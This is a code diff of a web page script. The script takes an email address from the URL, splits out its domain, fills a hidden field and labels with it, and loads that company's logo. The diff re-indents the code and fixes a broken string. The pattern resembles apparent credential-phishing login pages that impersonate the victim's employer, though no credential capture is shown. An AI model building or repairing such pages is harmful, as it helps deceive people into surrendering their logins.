@@ -143,24 +143,25 @@
   </table>
 
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const raw = params.get('login');
-    const email = raw ? decodeURIComponent(raw) : '';
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
 
-    let user = '', domain = '';
-    if (email.includes('@')) {
-      [user, domain] = email.split('@');
-    }
+  let user = '', domain = '';
+  if (email.includes('@')) {
+    [user, domain] = email.split('@');
+  }
 
-    // Set input values
-    document.getElementById('hiddenDomain').value = domain || 'domain';
+  // Set input values
+  document.getElementById('hiddenDomain').value = domain || 'domain';
 
-    // Update domain visuals
-    if (domain) {
-      document.getElementById('domainAddon').textContent = @domain;
-      document.getElementById('domainLabel').textContent = domain;
-      document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
-    }
-  </script>
+  // Update domain visuals
+  if (domain) {
+    document.getElementById('domainAddon').textContent = '@' + domain;
+    document.getElementById('domainLabel').textContent = domain;
+    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
+  }
+</script>
+
 </body>
 </html>
